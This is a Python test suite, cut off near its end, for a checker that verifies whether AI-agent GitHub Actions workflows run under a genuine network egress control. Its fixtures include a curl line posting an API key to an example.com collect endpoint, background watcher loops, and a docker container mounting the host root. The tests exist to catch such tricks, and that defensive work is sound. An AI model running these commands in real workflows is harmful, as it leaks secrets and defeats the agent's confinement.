"""The checker recognises a real egress control, and no look-alike (flagship slice 2c.3).

OBAAF-GHA-020 clears only when the agent runs under a control the checker read from the workflow and
the repository: GitHub's native egress firewall, or OBAAF's egress action at a commit OBAAF lists as
released with the agent as its command. Harden-Runner and the Agent Workflow Firewall in a script are
recognised, and are never better than "cannot tell". Every test below that expects "verified" has a
neighbour that changes one thing and must not.
"""

import copy
import dataclasses
import itertools
import json
import os
import unittest

from helpers import TempDir

from obaaf import checker
from obaaf.checker import baseline, report
from obaaf.checker import egress as egress_mod
from obaaf.checker.rules import CANNOT_TELL, NOT_MET, VERIFIED

SHA = "b" * 40
RELEASED = "c" * 40
HR_2_22_0 = "351661ca32ac09a36dc5ee2d536e3128f2a3c8ed"     # v2.22.0, as tagged on 2026-11-13
HR_2_15_1 = "58077d3c7e43986b6b15fba718e8ea69e387dfcc"     # v2.15.1
FIREWALL = "mode: enforce\nallow:\n  - api.example.com\n"


def catalog(releases=(RELEASED,)):
    """The catalog with `releases` as the commits of OBAAF's action OBAAF lists (none ship today)."""
    cat = checker.load()
    detection = copy.deepcopy(cat.detection)
    detection["egress_action_releases"] = list(releases)
    return dataclasses.replace(cat, detection=detection)


def workflow(steps, runs_on="ubuntu-24.04", job_extra="", top="", permissions="{contents: read}", on="workflow_dispatch"):
    lines = [f"on: {on}", "permissions: {}", top, "jobs:", "  agent:", f"    runs-on: {runs_on}"]
    if permissions is not None:
        lines.append(f"    permissions: {permissions}")
    if job_extra:
        lines.append(job_extra)
    lines.append("    steps:")
    lines.append(steps)
    return "\n".join(line for line in lines if line) + "\n"


def action(allow="api.example.com", run="claude -p 'review the change'", ref=RELEASED, extra="", step_id="agent"):
    with_ = []
    if allow is not None:
        with_.append(f"          allow: {allow}")
    if run is not None:
        with_.append(f"          run: {json.dumps(run)}")
    return (f"      - id: {step_id}\n        uses: Obaaf/OBAAF/actions/egress@{ref}\n" + extra +
            "        with:\n" + "\n".join(with_))


CHECKOUT = f"      - uses: actions/checkout@{SHA}\n        with: {{persist-credentials: false}}"


def run_check(text, files=None, config=None, cat=None, policy=None, single=False):
    with TempDir() as tmp:
        target = tmp / ".github" / "workflows"
        target.mkdir(parents=True)
        (target / "agent.yml").write_text(text, encoding="utf-8")
        (tmp / ".github" / "CODEOWNERS").write_text("* @example/maintainers\n", encoding="utf-8")
        if policy is not None:
            (tmp / ".github" / "egress-firewall.yaml").write_text(policy, encoding="utf-8")
        for name, body in (files or {}).items():
            path = tmp / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(body, encoding="utf-8")
        conf = checker.Config.from_data(config or {"lanes": {".github/workflows/agent.yml#agent": "agent"}},
                                        "obaaf.yml")
        where = target / "agent.yml" if single else tmp
        return checker.check(where, config=conf, catalog=cat or catalog())


def egress(result):
    found = [f for f in result.findings if f.rule == "OBAAF-GHA-020"]
    assert len(found) == 1, [(f.rule, f.kind, f.message) for f in result.findings]
    return found[0]


def verdict(finding):
    (control,) = finding.controls
    return control.verdict


def detail(finding):
    return finding.controls[0].detail


class NativeFirewallTest(unittest.TestCase):
    """GitHub's native egress firewall: `runs-on: ubuntu-24.04-firewall` and a policy file in
    enforce mode, which the firewall's README says is read only at `.github/egress-firewall.yaml`."""

    PLAIN = "      - run: python -m agents.fix"

    def firewall(self, policy=FIREWALL, **kw):
        kw.setdefault("runs_on", "ubuntu-24.04-firewall")
        return egress(run_check(workflow(self.PLAIN, **{k: v for k, v in kw.items() if k != "single"}),
                                policy=policy, single=kw.get("single", False)))

    def test_the_firewall_runner_with_an_enforcing_policy_clears_the_finding(self):
        f = self.firewall()
        self.assertEqual((f.kind, verdict(f), f.state), ("firewall-runner", VERIFIED, "fixed"))
        self.assertIn("technical preview", detail(f))
        self.assertIn("api.example.com", detail(f))
        self.assertIn("printed to the job's log or saved as an artifact is not blocked", detail(f))

    def test_it_clears_the_egress_control_of_a_secret_too(self):
        steps = "      - run: python -m agents.fix\n        env: {KEY: '${{ secrets.MODEL_API_KEY }}'}"
        result = run_check(workflow(steps, runs_on="ubuntu-24.04-firewall"), policy=FIREWALL)
        secret = next(f for f in result.findings if f.rule == "OBAAF-GHA-005")
        self.assertEqual(next(c.verdict for c in secret.controls if c.id == "egress-enforced"), VERIFIED)
        self.assertNotEqual(secret.state, "fixed")     # its other controls still stand

    def test_log_mode_no_file_or_a_misnamed_file_is_not_met(self):
        for policy in ("mode: log\nallow: [api.example.com]\n", None):
            with self.subTest(policy=policy):
                self.assertEqual(verdict(self.firewall(policy=policy)), NOT_MET)
        for name in ("Egress-Firewall.yaml", "egress-firewall.yml"):
            with TempDir() as tmp:
                (tmp / ".github" / "workflows").mkdir(parents=True)
                (tmp / ".github" / "workflows" / "agent.yml").write_text(
                    workflow(self.PLAIN, runs_on="ubuntu-24.04-firewall"), encoding="utf-8")
                (tmp / ".github" / name).write_text(FIREWALL, encoding="utf-8")
                conf = checker.Config.from_data({"lanes": {".github/workflows/agent.yml#agent": "agent"}}, "o.yml")
                f = egress(checker.check(tmp, config=conf, catalog=catalog()))
                with self.subTest(name=name):
                    self.assertEqual(verdict(f), NOT_MET)
                    self.assertIn("case sensitive", detail(f))

    def test_a_token_that_cannot_read_the_file_is_not_met(self):
        f = self.firewall(permissions="{}")
        self.assertEqual(verdict(f), NOT_MET)
        self.assertIn("contents", detail(f))
        f = self.firewall(permissions="{actions: read}")
        self.assertEqual(verdict(f), NOT_MET)

    def test_a_policy_the_checker_cannot_read_is_cannot_tell(self):
        for policy in ("mode: enforce\nmode: log\n", "mode: Enforce\n", "[mode, enforce]\n", "mode: enforce\nallow: x\n",
                       "mode: [enforce]\n"):
            with self.subTest(policy=policy):
                self.assertEqual(verdict(self.firewall(policy=policy)), CANNOT_TELL)

    def test_a_policy_that_allows_a_public_suffix_is_cannot_tell(self):
        f = self.firewall(policy="mode: enforce\nallow: [api.example.com, github.io]\n")
        self.assertEqual(verdict(f), CANNOT_TELL)
        self.assertIn("github.io", detail(f))

    def test_an_entry_that_is_not_a_plain_host_name_is_cannot_tell(self):
        for entry in ("'*.com'", "10.0.0.0/8", "https://api.example.com/v1", "'*'"):
            f = self.firewall(policy=f"mode: enforce\nallow: [{entry}]\n")
            with self.subTest(entry=entry):
                self.assertEqual(verdict(f), CANNOT_TELL)

    def test_the_detail_says_whether_githubs_defaults_are_allowed(self):
        self.assertIn("GitHub's default endpoints", detail(self.firewall()))
        f = self.firewall(policy="mode: enforce\nno-default-urls: true\nallow: [github.com]\n")
        self.assertEqual(verdict(f), VERIFIED)
        self.assertIn("github.com and nothing else", detail(f))

    def test_a_name_with_a_public_suffix_under_it_is_cannot_tell(self):
        self.assertEqual(verdict(self.firewall(policy="mode: enforce\nallow: [amazonaws.com]\n")), CANNOT_TELL)

    def test_a_policy_file_larger_than_the_checker_reads_is_cannot_tell(self):
        """Found by the first review: the first megabyte was read, and a later `mode: log` was not."""
        policy = FIREWALL + "# padding\n" * 120_000 + "mode: log\n"
        f = self.firewall(policy=policy)
        self.assertEqual(verdict(f), CANNOT_TELL)
        self.assertIn("larger than", detail(f))

    def test_a_merge_key_in_the_policy_is_cannot_tell(self):
        """Found by the second review: YAML 1.1 readers merge `<<`, YAML 1.2 readers see a key."""
        for policy in ("<<: {mode: enforce}\nallow: [api.example.com]\n",
                       "base: &b {mode: enforce}\n<<: *b\nallow: [api.example.com]\n",
                       "? <<\n: {mode: enforce}\nallow: [api.example.com]\n",
                       "allow: [api.example.com]\n!!merge \"x\": {mode: enforce}\n"):
            with self.subTest(policy=policy):
                self.assertEqual(verdict(self.firewall(policy=policy)), CANNOT_TELL)

    def test_a_disputed_line_break_in_the_policy_is_cannot_tell(self):
        """Found by the first review: a reader that does not break at U+2028 sees mode inside a comment."""
        for char in ("\u2028", "\u2029", "\u0085"):
            with self.subTest(char=repr(char)):
                f = self.firewall(policy=f"allow: [api.example.com] #{char}mode: enforce\n")
                self.assertEqual(verdict(f), CANNOT_TELL)

    def test_a_workflow_others_call_is_cannot_tell(self):
        for on in ("workflow_call", "[workflow_call, workflow_dispatch]"):
            f = self.firewall(on=on)
            with self.subTest(on=on):
                self.assertEqual(verdict(f), CANNOT_TELL)

    def test_a_link_in_place_of_the_policy_file_is_cannot_tell(self):
        with TempDir() as tmp:
            (tmp / ".github" / "workflows").mkdir(parents=True)
            (tmp / ".github" / "workflows" / "agent.yml").write_text(
                workflow(self.PLAIN, runs_on="ubuntu-24.04-firewall"), encoding="utf-8")
            (tmp / "real.yaml").write_text(FIREWALL, encoding="utf-8")
            os.symlink(tmp / "real.yaml", tmp / ".github" / "egress-firewall.yaml")
            conf = checker.Config.from_data({"lanes": {".github/workflows/agent.yml#agent": "agent"}}, "o.yml")
            self.assertEqual(verdict(egress(checker.check(tmp, config=conf, catalog=catalog()))), CANNOT_TELL)

    def test_one_file_checked_on_its_own_is_cannot_tell(self):
        f = self.firewall(single=True)
        self.assertEqual(verdict(f), CANNOT_TELL)
        self.assertIn("single workflow file", detail(f))

    def test_look_alike_runners_do_not_clear_it(self):
        for runs_on, expected in (("ubuntu-24.04", "none"), ("ubuntu-24.04-firewall-x", None),
                                  ("[ubuntu-24.04-firewall, self-hosted]", "none"),
                                  ("[self-hosted, linux]", "none")):
            f = self.firewall(runs_on=runs_on)
            with self.subTest(runs_on=runs_on):
                self.assertNotEqual(verdict(f), VERIFIED)
                if expected:
                    self.assertEqual(f.kind, expected)

    def test_a_runner_the_checker_cannot_name_with_an_enforcing_policy_is_cannot_tell(self):
        for runs_on in ("my-firewall-runner", "{group: larger, labels: [linux]}"):
            f = self.firewall(runs_on=runs_on)
            with self.subTest(runs_on=runs_on):
                self.assertEqual((f.kind, verdict(f)), ("firewall-runner", CANNOT_TELL))

    def test_a_matrix_with_one_leg_off_the_firewall_is_not_met(self):
        f = egress(run_check(workflow(self.PLAIN, runs_on="${{ matrix.os }}",
                                      job_extra="    strategy: {matrix: {os: [ubuntu-24.04-firewall, ubuntu-24.04]}}"),
                             policy=FIREWALL))
        self.assertEqual(verdict(f), NOT_MET)
        f = egress(run_check(workflow(self.PLAIN, runs_on="${{ matrix.os }}",
                                      job_extra="    strategy: {matrix: {os: [ubuntu-24.04-firewall]}}"),
                             policy=FIREWALL))
        self.assertEqual(verdict(f), VERIFIED)

    def test_the_report_puts_what_it_does_not_stop_beside_the_cleared_finding(self):
        result = run_check(workflow(self.PLAIN, runs_on="ubuntu-24.04-firewall"), policy=FIREWALL)
        text = report.to_text(result)
        self.assertIn("fixed: OBAAF-GHA-020", text)
        self.assertIn("technical preview", text)
        payload = json.loads(report.to_json(result))
        self.assertTrue(any(f["rule"] == "OBAAF-GHA-020" for f in payload["fixed"]))


class EgressActionTest(unittest.TestCase):
    """OBAAF's egress action confines its `run` input, so it clears the finding only when the agent
    is that command, the pin is a released commit, the allow-list is plain, and nothing later in the
    job runs what the command wrote."""

    def check(self, steps, cat=None, **kw):
        files = kw.pop("files", None)
        config = kw.pop("config", None)
        return egress(run_check(workflow(steps, **kw), files=files, config=config, cat=cat))

    def test_the_action_at_a_released_commit_with_the_agent_inside_clears_it(self):
        f = self.check(CHECKOUT + "\n" + action())
        self.assertEqual((f.kind, verdict(f), f.state), ("egress-action", VERIFIED, "fixed"))
        self.assertIn("DNS query", detail(f))
        self.assertIn("api.example.com", detail(f))
        self.assertEqual(f.facts["allow"], ["api.example.com"])

    def test_the_job_is_an_agent_job_from_the_command_inside_the_action(self):
        result = run_check(workflow(CHECKOUT + "\n" + action()), config={"lanes": {}})
        self.assertEqual(verdict(egress(result)), VERIFIED)

    def test_today_no_commit_is_listed_so_it_is_cannot_tell(self):
        f = self.check(action(), cat=checker.load())
        self.assertEqual(verdict(f), CANNOT_TELL)
        self.assertIn("none listed", detail(f))

    def test_a_pin_that_is_not_a_listed_commit_is_cannot_tell(self):
        for ref in (SHA, "v1", "main", RELEASED.upper()):
            with self.subTest(ref=ref):
                self.assertEqual(verdict(self.check(action(ref=ref))), CANNOT_TELL)

    def test_look_alike_actions_are_not_the_control(self):
        for uses in (f"Obaaf/OBAAF/actions/egress-lite@{RELEASED}", f"someone/OBAAF/actions/egress@{RELEASED}",
                     f"Obaaf/OBAAF/actions/egress/inner@{RELEASED}", "./actions/egress-copy",
                     f"Obaaf/OBAAF-actions/egress@{RELEASED}", "./actions/egress"):
            steps = action().replace(f"Obaaf/OBAAF/actions/egress@{RELEASED}", uses)
            f = self.check(steps + "\n      - run: claude -p x")
            with self.subTest(uses=uses):
                self.assertEqual((f.kind, verdict(f)), ("none", NOT_MET))

    def test_an_allow_list_with_a_public_suffix_or_a_name_the_action_refuses_is_not_met(self):
        for allow in ("github.io", "api.example.com,workers.dev", "'*.example.com'", "localhost", "co.uk",
                      "https://api.example.com", "1.2.3.4"):
            f = self.check(action(allow=allow))
            with self.subTest(allow=allow):
                self.assertEqual(verdict(f), NOT_MET)
        self.assertIn("public suffix", detail(self.check(action(allow="github.io"))))
        # A name under a public suffix is one registrant's: it is not a public suffix itself.
        self.assertEqual(verdict(self.check(action(allow="example.github.io"))), VERIFIED)

    def test_a_name_with_a_public_suffix_under_it_is_not_met(self):
        """Found by the first review: amazonaws.com is not a public suffix, s3.amazonaws.com is."""
        f = self.check(action(allow="amazonaws.com"))
        self.assertEqual(verdict(f), NOT_MET)
        self.assertIn("under it", detail(f))
        self.assertEqual(verdict(self.check(action(allow="bucket.s3.amazonaws.com"))), VERIFIED)

    def test_an_allow_list_computed_when_the_job_runs_is_cannot_tell(self):
        self.assertEqual(verdict(self.check(action(allow="${{ vars.ALLOW }}"))), CANNOT_TELL)

    def test_no_allow_or_no_run_is_not_met(self):
        self.assertEqual(verdict(self.check(action(allow=None))), NOT_MET)
        f = self.check(action(run=None) + "\n      - run: claude -p x")
        self.assertEqual(verdict(f), NOT_MET)

    def test_inputs_from_an_expression_are_cannot_tell(self):
        steps = (f"      - id: agent\n        uses: Obaaf/OBAAF/actions/egress@{RELEASED}\n"
                 "        with: ${{ fromJSON(vars.EGRESS) }}\n      - run: echo done")
        self.assertEqual(verdict(self.check(steps, config={"lanes": {".github/workflows/agent.yml#agent": "agent"}})),
                         CANNOT_TELL)

    def test_a_credential_anywhere_outside_the_confined_command_is_not_met(self):
        cases = {
            "another step": CHECKOUT.replace("{persist-credentials: false}",
                                             "{persist-credentials: false, token: '${{ secrets.BOT_TOKEN }}'}")
                            + "\n" + action(),
            "github.token in another step": "      - run: gh pr view\n        env: {GH_TOKEN: '${{ github.token }}'}\n"
                                            + action(),
            "GITHUB_TOKEN": "      - run: gh pr view\n        env: {GH_TOKEN: '${{ secrets.GITHUB_TOKEN }}'}\n" + action(),
            "toJSON(github)": "      - run: echo '${{ toJSON(github) }}' > ctx.json\n" + action(),
        }
        for what, steps in cases.items():
            f = self.check(steps)
            with self.subTest(what=what):
                self.assertEqual(verdict(f), NOT_MET)
                self.assertIn("outside the confined command", detail(f))
        f = self.check(action(), job_extra="    env: {KEY: '${{ secrets.MODEL_API_KEY }}'}")
        self.assertEqual(verdict(f), NOT_MET)
        f = self.check(action(), top="env: {KEY: '${{ secrets.MODEL_API_KEY }}'}")
        self.assertEqual(verdict(f), NOT_MET)

    def test_registry_credentials_of_services_are_not_a_credential_given_to_a_step(self):
        services = ("    services:\n      db:\n        image: example/db@sha256:" + "d" * 64 + "\n"
                    "        credentials: {username: bot, password: '${{ secrets.REGISTRY }}'}")
        self.assertEqual(verdict(self.check(action(), job_extra=services)), VERIFIED)

    def test_a_credential_passed_to_the_confined_command_is_said_beside_the_cleared_finding(self):
        """Until slice 2c.5 any credential in the confined step was "cannot tell". One the command can
        read limits the network no less; the report names it among what is not blocked (D-052)."""
        inside = action(extra="        env: {REVIEW_KEY: '${{ secrets.REVIEW_KEY }}'}\n",
                        allow="api.example.com\n          env: REVIEW_KEY")
        f = self.check(inside)
        self.assertEqual(verdict(f), VERIFIED)
        self.assertIn("the credentials passed to it included (secrets.REVIEW_KEY)", detail(f))
        f = self.check(action(run="claude -p '${{ secrets.REVIEW_KEY }}'"))
        self.assertEqual(verdict(f), VERIFIED)
        self.assertIn("secrets.REVIEW_KEY", detail(f))

    def test_an_agent_in_another_step_is_not_met(self):
        for other in (f"      - uses: anthropics/claude-code-action@{SHA}", "      - run: npx @openai/codex exec fix"):
            f = self.check(action(run="./build.sh") + "\n" + other)
            with self.subTest(other=other):
                self.assertEqual(verdict(f), NOT_MET)
        files = {"scripts/agent.sh": "#!/bin/sh\nclaude -p 'fix it'\n"}
        f = self.check(action(run="make test") + "\n      - run: ./scripts/agent.sh", files=files)
        self.assertEqual(verdict(f), NOT_MET)

    def test_no_credential_and_no_agent_the_checker_knows_is_cannot_tell(self):
        """The checker tells where an agent runs by where its key goes. With no key anywhere and no
        agent it recognises in the confined command, it cannot tell (decision D-050)."""
        f = self.check(CHECKOUT + "\n" + action(run="./scripts/home-grown.sh"))
        self.assertEqual(verdict(f), CANNOT_TELL)
        self.assertIn("needs no key", detail(f))

    def test_an_agent_in_a_script_the_confined_command_runs_is_recognised(self):
        files = {"scripts/agent.sh": "#!/bin/sh\nclaude -p 'fix it'\n"}
        f = self.check(action(run="./scripts/agent.sh"), files=files, config={"lanes": {}})
        self.assertEqual(verdict(f), VERIFIED)

    def test_uploading_the_output_is_fine_and_running_it_is_not(self):
        upload = (f"      - uses: actions/upload-artifact@{SHA}\n"
                  "        with: {name: out, path: '${{ steps.agent.outputs.workspace }}'}")
        self.assertEqual(verdict(self.check(action() + "\n" + upload)), VERIFIED)
        named = upload.replace("      - uses:", "      - name: Upload what obaaf-egress left\n        uses:")
        self.assertEqual(verdict(self.check(action() + "\n" + named)), VERIFIED)
        unsure = {
            "any script after it": "      - run: echo done",
            "another output": "      - run: echo '${{ steps.agent.outputs.denied }}'",
            "a script of the repository": "      - run: ./scripts/apply-fix.sh",
            "a script in it": "      - run: cd '${{ steps.agent.outputs.workspace }}' && make",
            "git in it": "      - run: git -C '${{ steps.agent.outputs.workspace }}' diff",
            "through env": "      - run: bash \"$WS/x.sh\"\n        env: {WS: '${{ steps.agent.outputs.scratch }}'}",
            "by its name": "      - run: bash /tmp/obaaf-egress.*/copy/x.sh",
            "by a pattern": "      - run: for f in /tmp/obaaf*/copy/*.sh; do bash \"$f\"; done",
            "anything in /tmp": "      - run: find /tmp -name '*.sh' -exec sh {} \\;",
            "every step's outputs": "      - run: echo '${{ toJSON(steps) }}'",
            "a computed step": "      - run: echo '${{ steps[inputs.which].outputs.workspace }}'",
            "a wildcard": "      - run: echo '${{ steps.*.outputs.workspace }}'",
            "the step's outputs as JSON": "      - run: echo '${{ toJSON(steps.agent.outputs) }}'",
            "another action's input": f"      - uses: example/run@{SHA}\n        with: {{dir: '${{{{ steps.agent.outputs.workspace }}}}'}}",
        }
        for what, later in unsure.items():
            f = self.check(action() + "\n" + later)
            with self.subTest(what=what):
                self.assertEqual(verdict(f), CANNOT_TELL)
        cache = f"      - uses: actions/cache/save@{SHA}\n        with: {{key: k, path: '${{{{ steps.agent.outputs.workspace }}}}'}}"
        f = self.check(action() + "\n" + cache)
        self.assertEqual(verdict(f), NOT_MET)
        self.assertIn("cache", detail(f))
        indexed = cache.replace("steps.agent.outputs.workspace", "steps.agent.outputs.*[0]")
        self.assertEqual(verdict(self.check(action() + "\n" + indexed)), NOT_MET)

    def test_a_cache_before_it_saves_after_it(self):
        """Found by the first review: actions/cache's post step saves its path after the job."""
        cache = f"      - uses: actions/cache@{SHA}\n        with: {{key: k, path: /tmp/obaaf-egress.*/workspace/node_modules}}"
        self.assertEqual(verdict(self.check(cache + "\n" + action())), NOT_MET)

    def test_a_step_before_it_that_leaves_a_process_running_is_cannot_tell(self):
        """Found by the first review: a loop left running by an earlier step ran what the command wrote."""
        for run in ("nohup sh -c 'while sleep 5; do sh ./x.sh; done' &", "./watch.sh &", "setsid ./watch.sh",
                    "docker run -d --name w example/watcher",
                    # Found by the second review.
                    "./scripts/watch.sh & echo \"started as $!\"", "docker run -dit --name h -v /:/host alpine sh",
                    "git log -1 --format=\" #%h\" ; ./scripts/watch.sh &", "docker compose up -d",
                    "screen -dmS w ./scripts/watch.sh", "tmux new -d -s w ./scripts/watch.sh",
                    # Found by the third review: quoting the comment remover misread, and detached forms.
                    "printf '%s\\n' $'it\\'s #1' ; ./scripts/watch.sh &",
                    "cat > notes.txt <<'EOF'\nit's done\nEOF\necho ' #a' ; ./scripts/watch.sh &",
                    "docker create --name h -v /:/host alpine sleep 1d\ndocker start h",
                    "docker compose up --wait", "coproc ./scripts/watch.sh",
                    # Found by the fourth review: spellings a list of forms missed, so any mention counts.
                    "docker run \\\n  --detach \\\n  -v /:/host \\\n  alpine sleep 1d",
                    "tmux new-session \\\n  -d -s w ./scripts/watch.sh", "docker run --detach=true alpine sleep 1d",
                    "true&&docker run -d alpine sleep 1d", "id=`docker run -d alpine sleep 1d`",
                    "/usr/bin/docker run -d alpine sleep 1d", "echo ./scripts/watch.sh | sudo at now",
                    "if true; then at now -f ./scripts/watch.sh; fi"):
            f = self.check(f"      - run: {json.dumps(run)}\n" + action())
            with self.subTest(run=run):
                self.assertEqual(verdict(f), CANNOT_TELL)
        self.assertEqual(verdict(self.check("      - run: make deps && make lint 2>&1\n" + action())), VERIFIED)

    def test_long_scripts_take_linear_time(self):
        """Found by the third review: a regular expression with chained `[^\\n]*` took 43 seconds on a
        14 KB workflow."""
        import time
        for line in ("tmux new " * 3000, "docker-compose up " * 2000, "docker run " * 4000, "screen x " * 4000,
                     "-" + "d" * 60000 + "1"):
            started = time.monotonic()
            self.check(f"      - run: {json.dumps('echo ' + line)}\n" + action())
            with self.subTest(line=line[:20]):
                self.assertLess(time.monotonic() - started, 5)

    def test_credentials_no_expression_hands_over_are_read(self):
        """Found by the first review: OIDC gives any step a cloud credential without a `secrets.`."""
        f = self.check(action(), permissions="{contents: read, id-token: write}")
        self.assertEqual(verdict(f), NOT_MET)
        self.assertIn("OIDC", detail(f))
        f = self.check(action(), permissions="{contents: read, models: read}")
        self.assertEqual(verdict(f), NOT_MET)
        self.assertEqual(verdict(self.check(action(), permissions="read-all")), NOT_MET)
        text = workflow(action(), permissions=None).replace("permissions: {}\n", "", 1)
        f = egress(run_check(text))
        self.assertEqual(verdict(f), CANNOT_TELL)
        self.assertIn("permissions", detail(f))

    def test_service_containers_with_volumes_are_cannot_tell(self):
        services = ("    services:\n      w:\n        image: example/w@sha256:" + "d" * 64 + "\n"
                    "        volumes: ['/tmp:/host-tmp']")
        self.assertEqual(verdict(self.check(action(), job_extra=services)), CANNOT_TELL)

    def test_a_step_before_it_is_not_after_it_but_one_beside_it_is(self):
        before = "      - run: make deps"
        self.assertEqual(verdict(self.check(before + "\n" + action())), VERIFIED)
        names_tmp = "      - run: rm -rf /tmp/obaaf-egress.old"
        self.assertEqual(verdict(self.check(names_tmp + "\n" + action())), CANNOT_TELL)
        group = ("      - parallel:\n" + action().replace("      - ", "          - ", 1).replace("\n        ", "\n            ")
                 + "\n          - run: bash /tmp/obaaf-egress.*/copy/x.sh")
        self.assertEqual(verdict(self.check(group)), CANNOT_TELL)
        background = action(extra="        background: true\n") + "\n" + "      - run: ls /tmp/obaaf-egress.*"
        self.assertEqual(verdict(self.check(background)), CANNOT_TELL)

    def test_runners_it_was_not_tested_on_are_cannot_tell(self):
        for runs_on in ("ubuntu-latest", "ubuntu-22.04", "[self-hosted, linux]"):
            with self.subTest(runs_on=runs_on):
                self.assertEqual(verdict(self.check(action(), runs_on=runs_on)), CANNOT_TELL)
        f = self.check(action(), job_extra="    container: node:20")
        self.assertEqual(verdict(f), CANNOT_TELL)

    def test_an_acceptance_of_cannot_tell_covers_the_file_that_was_looked_at(self):
        plain = self.check(action(), cat=checker.load())
        again = self.check(action(), cat=checker.load())
        moved = self.check(action() + "\n      - run: echo done", cat=checker.load())
        self.assertEqual(baseline.key(plain), baseline.key(again))
        self.assertNotEqual(baseline.key(plain), baseline.key(moved))


def keyed(model_keys="ANTHROPIC_API_KEY", env_input=None, step_env=None, run="claude -p 'review the change'",
          allow="api.example.com", ref=RELEASED, extra=""):
    """A step that uses OBAAF's egress action with `model-keys` (and `env`) inputs and a step `env`.
    `step_env` defaults to the model key from a secret of the same name."""
    if step_env is None:
        step_env = {"ANTHROPIC_API_KEY": "${{ secrets.ANTHROPIC_API_KEY }}"}
    lines = [f"      - id: agent\n        uses: Obaaf/OBAAF/actions/egress@{ref}\n"]
    if step_env:
        lines.append("        env:\n" + "".join(f"          {name}: {json.dumps(value)}\n"
                                                for name, value in step_env.items()))
    lines.append(extra)
    lines.append(f"        with:\n          allow: {allow}\n          run: {json.dumps(run)}\n")
    if model_keys is not None:
        lines.append(f"          model-keys: {model_keys}\n")
    if env_input is not None:
        lines.append(f"          env: {env_input}\n")
    return "".join(lines).rstrip("\n")


def secret_control(result):
    found = [f for f in result.findings if f.rule == "OBAAF-GHA-005"]
    assert len(found) == 1, [(f.rule, f.kind, f.message) for f in result.findings]
    return next(c for c in found[0].controls if c.id == "key-out-of-reach")


class ModelKeysTest(unittest.TestCase):
    """The checker reads the action's `model-keys` input (flagship slice 2c.5, decision D-052): a model
    key named there goes to AWF's API proxy, which the command can use and cannot read, and which
    reaches the provider's API host whatever the allow-list says. The control can be verified, with
    that host shown beside the allow-list and the provider's channel named beside the cleared finding."""

    def check(self, steps, cat=None, **kw):
        return egress(run_check(workflow(steps, **kw), cat=cat))

    def test_a_model_key_given_to_the_proxy_clears_it_and_the_report_names_the_provider(self):
        f = self.check(CHECKOUT + "\n" + keyed())
        self.assertEqual((f.kind, verdict(f), f.state), ("egress-action", VERIFIED, "fixed"))
        self.assertEqual(f.facts["allow"], ["api.example.com", "api.anthropic.com (through AWF's API proxy)"])
        for words in ("ANTHROPIC_API_KEY given to AWF's API proxy", "api.anthropic.com", "remote MCP servers",
                      "hosted web search and fetch tools", "job's log", "DNS query"):
            with self.subTest(words=words):
                self.assertIn(words, detail(f))

    def test_both_providers(self):
        env = {"ANTHROPIC_API_KEY": "${{ secrets.A }}", "OPENAI_API_KEY": "${{ secrets.O }}"}
        f = self.check(keyed(model_keys="ANTHROPIC_API_KEY,OPENAI_API_KEY", step_env=env))
        self.assertEqual(verdict(f), VERIFIED)
        self.assertEqual(f.facts["allow"], ["api.example.com", "api.anthropic.com (through AWF's API proxy)",
                                            "api.openai.com (through AWF's API proxy)"])
        self.assertIn("api.anthropic.com or api.openai.com", detail(f))

    def test_the_providers_host_is_part_of_the_finding(self):
        """What the command can reach is one of the finding's facts, as the allow-list is. (Any change to
        the workflow file changes the finding too, through its digest.)"""
        cat = checker.load()
        plain = self.check(keyed(model_keys=None, step_env={}), cat=cat)
        with_key = self.check(keyed(), cat=cat)
        self.assertEqual(plain.facts["allow"], ["api.example.com"])
        self.assertEqual(with_key.facts["allow"], ["api.example.com", "api.anthropic.com (through AWF's API proxy)"])

    def test_a_key_written_into_run_through_the_env_context_is_passed_to_the_command(self):
        """Found by the first review: GitHub writes a step's inputs with the env context, which holds the
        step's own env, so `${{ env.ANTHROPIC_API_KEY }}` in `run` hands the command the key that
        `model-keys` gives to the proxy."""
        for written in ("${{ env.ANTHROPIC_API_KEY }}", "${{ env.anthropic_api_key }}",
                        "${{ format('{0}', env.ANTHROPIC_API_KEY) }}", "${{ env['ANTHROPIC_API_KEY'] }}"):
            run = f"claude -p 'review the change'\ncurl -d 'k={written}' https://api.example.com/collect"
            result = run_check(workflow(keyed(run=run)))
            f, control = egress(result), secret_control(result)
            with self.subTest(written=written):
                self.assertNotIn("goes to AWF's API proxy", control.detail)
                self.assertIn("passed to the command in its run input, through env.ANTHROPIC_API_KEY", control.detail)
                self.assertIn("the credentials passed to it included (secrets.ANTHROPIC_API_KEY)", detail(f))
        # The whole env context: every credential of the step's env reaches the command, and the
        # checker cannot name what part of it is used.
        f = self.check(keyed(run="claude -p '${{ toJSON(env) }}'"))
        self.assertEqual(verdict(f), CANNOT_TELL)
        self.assertIn("whole env context", detail(f))
        # A secret named under neither input, written in through env, is passed too.
        env = {"REVIEW_KEY": "${{ secrets.REVIEW_KEY }}"}
        control = secret_control(run_check(workflow(keyed(model_keys=None, step_env=env,
                                                          run="claude -p 'use ${{ env.REVIEW_KEY }}'"))))
        self.assertNotIn("named under neither", control.detail)
        self.assertIn("secrets.REVIEW_KEY is passed to the command in its run input, through env.REVIEW_KEY",
                      control.detail)
        # github.token through env: the egress finding names it, though there is no secret finding.
        steps = keyed(model_keys=None, step_env={"TOK": "${{ github.token }}"}, run='claude -p "use ${{ env.TOK }}"')
        f = self.check(steps)
        self.assertIn("the credentials passed to it included (github.token)", detail(f))
        # In another input, through env: not placed.
        steps = keyed().replace("          allow:", "          note: '${{ env.ANTHROPIC_API_KEY }}'\n          allow:")
        self.assertEqual(verdict(self.check(steps)), CANNOT_TELL)

    def test_the_secret_finding_says_what_could_not_be_placed(self):
        """Found by the first review: a credential the checker could not place was named nowhere."""
        steps = keyed(extra="        if: github.token != ''\n").replace(
            "          allow:", "          note: '${{ secrets.OTHER }}'\n          allow:")
        control = secret_control(run_check(workflow(steps)))
        self.assertIn("the checker could not place", control.detail)
        self.assertIn("secrets.OTHER", control.detail)
        self.assertIn("github.token", control.detail)
        control = secret_control(run_check(workflow(keyed(model_keys="GEMINI_API_KEY"))))
        self.assertIn("the action would refuse to run", control.detail)

    def test_a_name_not_written_as_text_is_cannot_tell(self):
        """Found by the second review: `true:` was read as a boolean and compared as "True"."""
        steps = keyed(model_keys=None, step_env={}, env_input="'true'").replace(
            "        with:", "        env:\n          true: ${{ secrets.X }}\n        with:")
        f = self.check(steps)
        self.assertEqual(verdict(f), CANNOT_TELL)
        self.assertIn("not written as text", detail(f))

    def test_a_key_written_into_run_is_still_named_beside_the_provider(self):
